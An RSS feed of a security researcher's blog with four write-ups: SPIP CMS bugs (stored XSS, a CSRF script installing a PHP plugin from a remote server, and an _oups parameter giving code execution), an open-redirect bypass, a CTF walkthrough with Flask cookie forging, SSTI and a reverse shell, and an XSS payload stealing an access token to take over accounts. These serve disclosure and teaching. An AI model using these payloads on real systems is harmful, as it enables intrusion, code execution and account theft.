<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on SpawnZii</title>
        <link>https://SpawnZii.github.io/posts/</link>
        <description>Recent content in Posts on SpawnZii</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 12 Jul 2022 13:02:46 +0200</lastBuildDate>
        <atom:link href="https://SpawnZii.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>How we have pwned Root-Me in 2022</title>
            <link>https://SpawnZii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/</link>
            <pubDate>Tue, 12 Jul 2022 13:02:46 +0200</pubDate>
            
            <guid>https://SpawnZii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/</guid>
            <description>Introduction With a friend (cc Abyss Watcher) we decided to look for vulnerabilities on the SPIP CMS, Root-Me being based on spip we will be able to report vulnerabilities on the platform. In the first days we managed to find some bugs, XSS, CSRF and RCE.
Environment Of course we did not our research directly on root me. So we set up a local spip environment.
 SPIP version 4.1.2 https://files.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>With a friend (cc <a href="https://github.com/Abyss-W4tcher">Abyss Watcher</a>) we decided to look for vulnerabilities on the SPIP CMS, Root-Me being based on spip we will be able to report vulnerabilities on the platform.
In the first days we managed to find some bugs, XSS, CSRF and RCE.</p>
<h2 id="environment">Environment</h2>
<p>Of course we did not our research directly on root me. So we set up a local spip environment.</p>
<ul>
<li>SPIP version 4.1.2 <a href="https://files.spip.net/spip/archives/spip-v4.1.2.zip">https://files.spip.net/spip/archives/spip-v4.1.2.zip</a></li>
<li>Docker (credit <a href="https://twitter.com/TheLaluka?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Laluka</a>):</li>
</ul>
<pre><code class="language-yaml=" data-lang="yaml=">version: '3.5'

services:
  db:
    image: mysql:5.6
    command: --default-authentication-plugin=mysql_native_password
    environment:
        - MYSQL_ROOT_PASSWORD=root
    ports:
        - 3306:3306

  adminer:
    image: adminer
    ports:
        - 81:8080

  spip:
    image: php:8.0
    ports:
        - 80:80
    volumes:
        - ./spip:/spip
    working_dir: /spip
    entrypoint: [&quot;bash&quot;, &quot;-c&quot;, &quot;apt update &amp;&amp; apt install -y default-mysql-client &amp;&amp; docker-php-ext-install mysqli &amp;&amp; apt install -y libzip-dev zip &amp;&amp; docker-php-ext-install zip &amp;&amp; php -S 0.0.0.0:80&quot;]
</code></pre><ul>
<li>We have also activated the &ldquo;<a href="https://www.spip.net/fr_article4642.html">parano</a>&rdquo; mode, this mode allows to disable the execution of javascript in the articles.</li>
</ul>
<pre><code class="language-php=" data-lang="php=">// sécuriser les scripts javascript en mode parano
$GLOBALS['filtrer_javascript'] = -1;
</code></pre><h2 id="-bug-1---a-simple-xss-to-start"># Bug 1 - A simple XSS to start</h2>
<p>After some research I managed to identify a trivial stored  XSS. An author can add hyperlink with the following payload <code>javascript:alert(document.domain)</code>, So when the user clicks on the link, the javascript will be executed.</p>
<p><img src="/posts/rmrce/pldsimplexss.png" alt="form"></p>
<p>It&rsquo;s possible to trigger the xss at several places, on the public part of the site.</p>
<p><img src="/posts/rmrce/publictriggerxss.png" alt="form"></p>
<p>And on the administration interface.</p>
<p><img src="/posts/rmrce/triggerxss.png" alt="form"></p>
<h3 id="xss-to-csrf-to-rce-">XSS to CSRF to RCE ?</h3>
<p>I had the idea to try to upload a php plugin with a csrf, for that we will look at a function of spip allowing an administrator to upload a plugin from a remote server.</p>
<p><img src="/posts/rmrce/manage.png" alt="form"></p>
<p>Two tokens are passed in the request, they are found in the form.</p>
<p><img src="/posts/rmrce/token.png" alt="form"></p>
<p>It&rsquo;s time to build our payload !</p>
<h3 id="evil-plugin-setup">Evil plugin setup.</h3>
<p>The function to download a plugin waits for a zip file, so we must create our plugins on our remote server.</p>
<pre><code class="language-bash=" data-lang="bash=">┌──(spawnzii㉿spawnzii)-[/tmp/websrv]
└─$ echo '&lt;?php system(&quot;id&quot;);?&gt;' &gt; spzrce.php  
                                                                                
┌──(spawnzii㉿spawnzii)-[/tmp/websrv]
└─$ zip spzrce.zip spzrce.php 
  adding: spzrce.php (stored 0%)
</code></pre><p>Our plugin is ready, we can place it in a listening web server.</p>
<h3 id="csrf-paylaod-construction">CSRF paylaod construction.</h3>
<p>On the first part we will make a request to get the tokens.</p>
<pre><code class="language-javascript=" data-lang="javascript=">var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
xhr.responseType = 'document';
xhr.send();
xhr.onreadystatechange = function () {
if (xhr.readyState == 4) {
  token_sign = xhr.response.getElementsByName('formulaire_action_sign')[1].value;
  token_arg = xhr.response.getElementsByName('formulaire_action_args')[1].value;
  token_sign = encodeURIComponent(token_sign);
  token_arg = encodeURIComponent(token_arg);
  }
}
</code></pre><p>Now that we have our two tokens, we can build the request to upload a plugin.</p>
<pre><code class="language-javascript=" data-lang="javascript=">function csrf_rce() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
    xhr.responseType = 'document';
    xhr.send();

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
            token_sign = xhr.response.getElementsByName('formulaire_action_sign')[1].value;
            token_arg = xhr.response.getElementsByName('formulaire_action_args')[1].value;
            token_sign = encodeURIComponent(token_sign);
            token_arg = encodeURIComponent(token_arg);
            var xhrr=new XMLHttpRequest();
            xhrr.open('POST', 'http://localhost/ecrire/?exec=charger_plugin', true);
            xhrr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhrr.onload = function () {
                console.log(this.responseText);
            }
            xhrr.send(`var_ajax=form&amp;exec=charger_plugin&amp;formulaire_action=charger_plugin_archive&amp;formulaire_action_args=${token_arg}&amp;formulaire_action_sign=${token}&amp;archive=http%3A%2F%2Fyourserver%2Fspzrce.zip&amp;destination=`);
        }
    };
}

csrf_rce();
</code></pre><p>We just have to encode our payload in base64 and paste it on the hyperlink.</p>
<p><img src="/posts/rmrce/pldcsrf.png" alt="form"></p>
<p>If a webmaster click on our link, the plugin will be upload on the web server.</p>
<p><img src="/posts/rmrce/apresclique.png" alt="form"></p>
<p>We can go to our plugin to see the result.</p>
<p><img src="/posts/rmrce/poc.png" alt="form"></p>
<h2 id="-bug-2---on-est-bon-rien-a-faire-sounds-like-rce"># Bug 2 - &ldquo;On est bon, rien a faire&rdquo; sounds like RCE</h2>
<p>After a few days Abyss watcher had the idea to watch the fix of an old vulnerability (cc <a href="https://twitter.com/TheLaluka?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Laluka</a>).</p>
<p><img src="/posts/rmrce/oupscommit.png" alt="form"></p>
<p>The oups parameter therefore expects a serialized object encoded in base64.
To debug  we can add a <code>print_r</code> of the variable <code>$valeurs</code> on the code.</p>
<p><img src="/posts/rmrce/val.jpg" alt="form"></p>
<p>Now what happens if we put a simple sting like <strong>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=notanobject</strong> on <code>_oups</code> parameter ?</p>
<p><img src="/posts/rmrce/nv.png" alt="form"></p>
<p>Nothing, <code>_oups</code> is empty.</p>
<p>But now try to inject serialized object, <code>TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9</code>.</p>
<p><img src="/posts/rmrce/v.png" alt="form"></p>
<p>The string is reflected several times in the source code.</p>
<p><img src="/posts/rmrce/inj.png" alt="form"></p>
<p>We can try to inject with <strong><code>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'&quot;&lt;h1&gt;inject here&lt;/h1&gt;</code></strong></p>
<p><img src="/posts/rmrce/h1.png" alt="form"></p>
<p>Damnnn, nice we have html injection.</p>
<p>Are you remember <a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/">the Laluka&rsquo;s RCE ?</a>
And if we try to reproduce the same thing on our injection. <strong><code>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'&quot;&lt;?php system('id');?&gt;</code></strong>.</p>
<p><img src="/posts/rmrce/rcepoc.png" alt="form"></p>
<p>BOOM RCE !!!</p>
<h2 id="small-explanations">Small explanations</h2>
<p><img src="/posts/rmrce/mm.jpg" alt="form"></p>
<p>SPIP uses skeletons, a kind of html template that is used to formalise the rendering of a page. The problem here is that once the skeleton is filled in, it is passed to a function that evaluates the page (evaluer_page.php). So as we inject into the skeleton, once passed into the function evaluate_page.php the php is interpreted.</p>
<h2 id="conclusion">Conclusion</h2>
<p>It was a great experience to share our research with Abyss Watcher. We are happy to have contributed to the security of SPIP and Root-Me.</p>
<p><img src="/posts/rmrce/sq.jpg" alt="form"></p>
]]></content>
        </item>
        
        <item>
            <title>[Bug Bounty] Open Redirect</title>
            <link>https://SpawnZii.github.io/posts/2022/04/bug-bounty-open-redirect/</link>
            <pubDate>Thu, 28 Apr 2022 13:52:15 +0200</pubDate>
            
            <guid>https://SpawnZii.github.io/posts/2022/04/bug-bounty-open-redirect/</guid>
            <description>Introduction Hello, in this article I will detail the exploitation of a small bug that I found on a private program.
The program has several scopes. One of the domains hosts a joomla. The site is static only a notification form is available.
Exploitation So I intercepted the form&amp;rsquo;s request.Let&amp;rsquo;s assume that the target domain is www.spawnzii.com.
POST /en/news HTTP/2 Host: www.spawnzii.com Cookie: cookieconsent_status=allow; aac5b3673d9cdeeefrf321e0c24cefe=h1uv6gsg0ucbpfgq249148vt7p User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Hello, in this article I will detail the exploitation of a small bug that I found on a private program.</p>
<p>The program has several scopes. One of the domains hosts a joomla. The site is static only a notification form is available.</p>
<p><img src="/posts/opr/forms.png" alt="form"></p>
<h2 id="exploitation">Exploitation</h2>
<p>So I intercepted the form&rsquo;s request.<!-- raw HTML omitted -->
Let&rsquo;s assume that the target domain is <a href="http://www.spawnzii.com">www.spawnzii.com</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">POST /en/news HTTP/2
Host: www.spawnzii.com
Cookie: cookieconsent_status<span style="color:#f92672">=</span>allow; aac5b3673d9cdeeefrf321e0c24cefe<span style="color:#f92672">=</span>h1uv6gsg0ucbpfgq249148vt7p
User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:91.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: <span style="color:#ae81ff">227</span>
Origin: https://www.spawnzii.com
Referer: https://www.spawnzii.com/en/news
Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

user<span style="color:#f92672">[</span>name<span style="color:#f92672">]=</span>spz&amp;user<span style="color:#f92672">[</span>email<span style="color:#f92672">]=</span>spz@gmail.com&amp;ajax<span style="color:#f92672">=</span>0&amp;acy_source<span style="color:#f92672">=</span>module_396&amp;ctrl<span style="color:#f92672">=</span>sub&amp;task<span style="color:#f92672">=</span>optin&amp;redirect<span style="color:#f92672">=</span>https://www.spawnzii.com/en/news&amp;redirectunsub<span style="color:#f92672">=</span>https://www.spawnzii.com/en/news&amp;option<span style="color:#f92672">=</span>com_acymailing&amp;hiddenlists<span style="color:#f92672">=</span>1&amp;acyformname<span style="color:#f92672">=</span>formAcymailing2321
</code></pre></div><p>In this request there are two interesting parameters that seem to redirect to a page after joining the notification.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&amp;redirect<span style="color:#f92672">=</span>https://www.spawnzii.com/en/news&amp;redirectunsub<span style="color:#f92672">=</span>https://www.spawnzii.com/en/news
</code></pre></div><p>if we try to change the value of these two parameters by <strong><a href="http://www.google.com">www.google.com</a></strong>, we get an error message saying that the domain is not allowed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">HTTP/2 200 OK
Server: nginx
Date: Wed, 16 Mar 2022 13:34:25 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 414
X-Content-Type-Options: nosniff
Vary: Accept-Encoding
X-Varnish: 25024599
Age: 0
Accept-Ranges: bytes

&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;This redirect url is not allowed, you should change the &#34;Allowed domains for the redirection via the module&#34; parameter from the AcyMailing configuration page to &#34;spawnzii.com.au|mail.spawnzii.com.au|fr.SpawnZii.org|SpawnZiifr.com|SpawnZiiprodv2.corp.fr|google.com&#34; to allow it or set it to &#34;all&#34; to allow all urls&#39;</span>); window.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">go</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);&lt;/<span style="color:#f92672">script</span>&gt;
</code></pre></div><h2 id="filter-bypass">Filter Bypass</h2>
<p>We can perform a redirection by making the browser believe that it is going to connect to another site using the <em>@</em>.</p>
<p>I replace the value of the two parameters by : <em><code>https://www.spawnzii.com@www.google.com</code></em>.</p>
<p>And we get a redirection to <a href="http://www.google.com">www.google.com</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">HTTP/2 <span style="color:#ae81ff">303</span> See Other
Server: nginx
Date: Wed, <span style="color:#ae81ff">16</span> Mar <span style="color:#ae81ff">2022</span> 14:22:10 GMT
Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
Content-Length: <span style="color:#ae81ff">0</span>
Cache-Control: public, max-age<span style="color:#f92672">=</span>3600, stale-while-revalidate<span style="color:#f92672">=</span>7200, stale-if-error<span style="color:#f92672">=</span><span style="color:#ae81ff">18000</span>
Expires: Wed, <span style="color:#ae81ff">16</span> Mar <span style="color:#ae81ff">2022</span> 15:22:10 GMT
Pragma: public
X-Logged-In: False
X-Content-Type-Options: nosniff
Location: https://www.spawnzii.com@www.google.com
X-Varnish: <span style="color:#ae81ff">24047579</span>
Age: <span style="color:#ae81ff">0</span>
</code></pre></div><h2 id="poc">PoC</h2>
<p>Now we have a redirect, we need to be able to send it to a user (remember we modify a POST request). To do this I simply changed the type of the request to GET.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /en/news?user<span style="color:#f92672">[</span>name<span style="color:#f92672">]=</span>rezq&amp;user<span style="color:#f92672">[</span>email<span style="color:#f92672">]=</span>spz@gmail.com&amp;ajax<span style="color:#f92672">=</span>0&amp;acy_source<span style="color:#f92672">=</span>module_396&amp;ctrl<span style="color:#f92672">=</span>sub&amp;task<span style="color:#f92672">=</span>optin&amp;redirect<span style="color:#f92672">=</span>https://www.spawnzii.com@www.google.com&amp;redirectunsub<span style="color:#f92672">=</span>https://www.spawnzii.com@www.google.com&amp;option<span style="color:#f92672">=</span>com_acymailing&amp;hiddenlists<span style="color:#f92672">=</span>1&amp;acyformname<span style="color:#f92672">=</span>formAcymailing44291 HTTP/2
Host: www.spawnzii.com
Cookie: cookieconsent_status<span style="color:#f92672">=</span>allow; aac5b3673d9cdeeeda1df9804cefe<span style="color:#f92672">=</span>h1uv6gsg0u76pfgqh09148vt7p
User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:91.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,*/*;q<span style="color:#f92672">=</span>0.8
Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.5
Accept-Encoding: gzip, deflate
Origin: https://www.spawnzii.com
Referer: https://www.spawnzii.com/en/news
Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
</code></pre></div><p>Payload : <em><a href="https://www.spawnzii.com/en/news?user%5Bname%5D=spz&amp;user%5Bemail%5D=spz@gmail.com&amp;ajax=0&amp;acy_source=module_396&amp;ctrl=sub&amp;task=optin&amp;redirect=https://www.spawnzii.com@www.google.com&amp;redirectunsub=https://www.spawnzii.com@www.google.com&amp;option=com_acymailing&amp;hiddenlists=1&amp;acyformname=formAcymailing44201">https://www.spawnzii.com/en/news?user[name]=spz&amp;user[email]=spz@gmail.com&amp;ajax=0&amp;acy_source=module_396&amp;ctrl=sub&amp;task=optin&amp;redirect=https://www.spawnzii.com@www.google.com&amp;redirectunsub=https://www.spawnzii.com@www.google.com&amp;option=com_acymailing&amp;hiddenlists=1&amp;acyformname=formAcymailing44201</a></em></p>
]]></content>
        </item>
        
        <item>
            <title>[Midnightflag] BGK Writeup</title>
            <link>https://SpawnZii.github.io/posts/2022/04/midnightflag-bgk-writeup/</link>
            <pubDate>Thu, 28 Apr 2022 13:52:15 +0200</pubDate>
            
            <guid>https://SpawnZii.github.io/posts/2022/04/midnightflag-bgk-writeup/</guid>
            <description>Introduction Writeup d&amp;rsquo;un challenge que j&amp;rsquo;ai proposé pour le Midnightflag ctf. L&amp;rsquo;objectif est d&amp;rsquo;obtenir le flag situé dans le fichier /root/flag.txt du serveur. Pour ce faire les joueurs devront exploiter une webapp flask.
Step 1 : Exploitation d&amp;rsquo;un cookie flask On lance une énumération classique des dossiers sur le serveur web.
gobuster dir -u http://172.17.0.2:8181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Writeup d&rsquo;un challenge que j&rsquo;ai proposé pour le Midnightflag ctf.
L&rsquo;objectif est d&rsquo;obtenir le flag situé dans le fichier /root/flag.txt du serveur.
Pour ce faire les joueurs devront exploiter une webapp flask.</p>
<p><img src="/posts/bgk/home.png" alt="form"></p>
<h2 id="step-1--exploitation-dun-cookie-flask">Step 1 : Exploitation d&rsquo;un cookie flask</h2>
<p>On lance une énumération classique des dossiers sur le serveur web.</p>
<pre><code>gobuster dir -u http://172.17.0.2:8181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt               
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:8181/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/28 14:35:02 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 711]
/signup               (Status: 200) [Size: 764]
/logout               (Status: 302) [Size: 248] [--&gt; http://172.17.0.2:8181/login?next=%2Flogout]
/scan                 (Status: 200) [Size: 40]
</code></pre><p>On remarque aussi que <strong>/scan</strong> existe, elle est pour le moment inaccessible.
Une page d&rsquo;inscription est disponible, on peut alors essayer de s&rsquo;inscrire.</p>
<p><img src="/posts/bgk/register.png" alt="form"></p>
<p>Une fois authentifié sur le site on essaye de se rendre sur la page de scan, toujours inaccessible.
On remarque alors que notre cookie de session est un cookie flask.</p>
<p><img src="/posts/bgk/console.png" alt="form"></p>
<p>On peut alors essayer de decoder le cookie avec <strong>flask-unsign</strong>.</p>
<p><img src="/posts/bgk/flask-decode.png" alt="form"></p>
<p>Essayons maintenant de bruteforcer la clé permettant de signer le cookie.</p>
<p><img src="/posts/bgk/secret.png" alt="form"></p>
<p>Bingo ! on obtient la secret key : <strong>coldwar</strong>.</p>
<p>On peut maintenant modifier le champ user_id de notre cookie pour lui attribuer la valeur <strong>1</strong>.</p>
<p><img src="/posts/bgk/cookiesign.png" alt="form"></p>
<p>Nous pouvons maintenant utiliser le cookie pour obtenir une session <strong>admin</strong> et accéder à la page /scan.</p>
<p><img src="/posts/bgk/admin.png" alt="form"></p>
<h2 id="step-2--exploitation-dune-server-side-template-injection">Step 2 : Exploitation d&rsquo;une Server Side Template Injection</h2>
<p>Sur la page de scan nous trouvons une input demandant une url.
On lance notre serveur web et on rentre notre url.</p>
<p><img src="/posts/bgk/scan.png" alt="form"></p>
<p>Le web serveur fait plusieurs requêtes sur notre serveur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">spawnzii@yeswefiak:/var/www/html$ python3 -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -
127.0.0.1 - - [28/Apr/2022 15:15:35] code 404, message File not found
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET /robots.txt HTTP/1.1&#34; 404 -
127.0.0.1 - - [28/Apr/2022 15:15:35] &#34;GET / HTTP/1.1&#34; 200 -

</code></pre></div><p>Nous avons certaines informations en retour, comme le titre, le robots.txt,les fichiers js &hellip;</p>
<p><img src="/posts/bgk/reponse.png" alt="form"></p>
<p>On peut essayer de modifier le titre de notre serveur web en plaçant par exemple <strong>{{7*7}}</strong>.
<img src="/posts/bgk/testssti.png" alt="form"></p>
<p>Le titre est filtré, nous obtenons <strong>{7*7}</strong>.</p>
<p><img src="/posts/bgk/filter1.png" alt="form"></p>
<p>Il est possible de bypass le filtre avec <strong>{{{7*7}}}</strong>
<img src="/posts/bgk/49.png" alt="form"></p>
<p>On essaye la fameuse payload : <code>{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}</code></p>
<p>Ehhh bah non.
<img src="/posts/bgk/mm.png" alt="form"></p>
<p>Il reste donc encore quelques filtres à bypass.
Pour trouver quels caractères sont filtrés on passe **{{import os global[]'.()&quot;_ }}** en titre.</p>
<p>On obtient <code>заглавие : {import os global'()&quot; }</code>. Les
caratères <strong>[]._</strong> sont donc ﬁltrés</p>
<p>Notre payload final :</p>
<p><img src="/posts/bgk/PLD.png" alt="form"></p>
<p>On a bien notre reverse shell.</p>
<p><img src="/posts/bgk/shell.png" alt="form"></p>
<h2 id="step-2--crontab--notify-for-the-win">Step 2 : Crontab &amp; notify for the win</h2>
<p>Après énumération du serveur on remarque :</p>
<ul>
<li>/root/.config/notify est accessible en lecture et écriture.</li>
<li>/etc/cron.d/job-cron inaccessible en lecture.</li>
</ul>
<p>Ne pouvant pas accéder au crontab il nous faut trouver un moyen de voir ce qu&rsquo;il se passe sur la machine.
Nous pouvons utiliser <strong><a href="https://github.com/DominicBreuker/pspy">pspy</a></strong> pour voir les processus en cours d&rsquo;executions.</p>
<p><img src="/posts/bgk/cron.png" alt="form"></p>
<p>Voilà on recupère le crontab :).
On comprend que le flag est pipe vers notify.</p>
<p>Après quelques recherches on trouve le repo <strong><a href="https://github.com/projectdiscovery/notify">github</a></strong> de notify. Ce tool permet de transmettre le résultat d&rsquo;une commande sur différentes plateformes tel que discord, telegram &hellip;</p>
<p>Il ne nous reste plus qu'à configurer notre provider-config.yaml avec notre webhook discord, situé dans <strong>/root/.config/notify</strong>.</p>
<p><img src="/posts/bgk/provider.png" alt="form"></p>
<p>On attend que le crontab soit exécuté.</p>
<p><img src="/posts/bgk/flag.png" alt="form"></p>
]]></content>
        </item>
        
        <item>
            <title>[Bug Bounty] XSS to Account Takeover</title>
            <link>https://SpawnZii.github.io/posts/2022/03/bug-bounty-xss-to-account-takeover/</link>
            <pubDate>Mon, 28 Mar 2022 18:46:31 +0200</pubDate>
            
            <guid>https://SpawnZii.github.io/posts/2022/03/bug-bounty-xss-to-account-takeover/</guid>
            <description>Introduction Hello, in this article I will detail the exploitation of a bug that I found on a private program on Yes We Hack.
I started to list the web application. A feature of the application allows the user to plublish an article. I tried several xss payloads but as the program is quite old all the inputes were correctly filtered
It is possible to publish an article from a url, by passing the url of an article the web application will preload the title and content of the article.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Hello, in this article I will detail the exploitation of a bug that I found on a private program on Yes We Hack.</p>
<p>I started to list the web application. A feature of the application allows the user to plublish an article. I tried several xss payloads but as the program is quite old all the inputes were correctly filtered</p>
<p><img src="/posts/crsf/upload.jpg" alt="form"></p>
<p>It is possible to publish an article from a url, by passing the url of an article the web application will preload the title and content of the article. So I put the ip of my vps.</p>
<p><img src="/posts/crsf/url.png" alt="form"></p>
<p>Server logs (I already test for <strong>SSRF</strong> but it was correctly filtered)</p>
<p><img src="/posts/crsf/srvtrace.jpg" alt="form"></p>
<p>As you can see the title of my web server is preloaded result.</p>
<p><img src="/posts/crsf/spzwhere.jpg" alt="form"></p>
<h2 id="exploitation">Exploitation</h2>
<p>So I had the idea to put an xss payload in the title of my web server.</p>
<p><img src="/posts/crsf/pldxss.png" alt="form"></p>
<p>Now we have an stored xss. If a user clicks on the article the <strong>XSS</strong> will be triggered.</p>
<p><img src="/posts/crsf/xss.jpg" alt="form"></p>
<h2 id="elevate-the-impact">Elevate the impact</h2>
<p>I will try to create a <strong>CSRF</strong> to change the user&rsquo;s email</p>
<h3 id="step-1">Step 1</h3>
<p>First we will look at what the mail change request looks like by going to our settings and changing our mail.</p>
<p><img src="/posts/crsf/email.jpg" alt="form"></p>
<p>I enter a different email and intercept the request with Burp.</p>
<p><img src="/posts/crsf/burp.jpg" alt="form"></p>
<p>The request must contain several headers, an email field with its value and the access token.
Our access token is stored locally.</p>
<p>You can get it with this piece of js code :</p>
<pre><code class="language-javascript=" data-lang="javascript=">Object.keys(localStorage).some(function (key) {
  if(/access/.test(key)) console.log(localStorage[key])
});
</code></pre><p>The final payload :</p>
<pre><code class="language-javascript=" data-lang="javascript=">&lt;img/src/onerror='Object.keys(localStorage).some(function (key) { 
  if(/access/.test(key)){ var data = {&quot;AccessToken&quot;:localStorage[key],&quot;UserAttributes&quot;:[{&quot;Name&quot;:&quot;email&quot;,&quot;Value&quot;:&quot;fakeemailattacker@yopmail.com&quot;}]}; 
  var xhr = new XMLHttpRequest(); 
  xhr.open(&quot;POST&quot;,&quot;https://fakedomain.com/&quot;,true); 
  xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-amz-json-1.1&quot;); 
  xhr.setRequestHeader(&quot;XXXXXCUSTOMHEADER&quot;,&quot;XXXXXCUSTOMHEADER&quot;); 
  xhr.setRequestHeader(&quot;XXXXXCUSTOMHEADER&quot;,&quot;XXXXXCUSTOMHEADER&quot;); 
  xhr.send(JSON.stringify(data)); 
  return;
  }});'&gt;
</code></pre><p>We place the payload in the title of our web server and check our mailbox.</p>
<p><img src="/posts/crsf/pldfinal.jpg" alt="form"></p>
<p>PoC:</p>
<p><img src="/posts/crsf/poc.jpg" alt="form"></p>
<p>Unfortunately this is a duplicate :(</p>
]]></content>
        </item>
        
    </channel>
</rss>
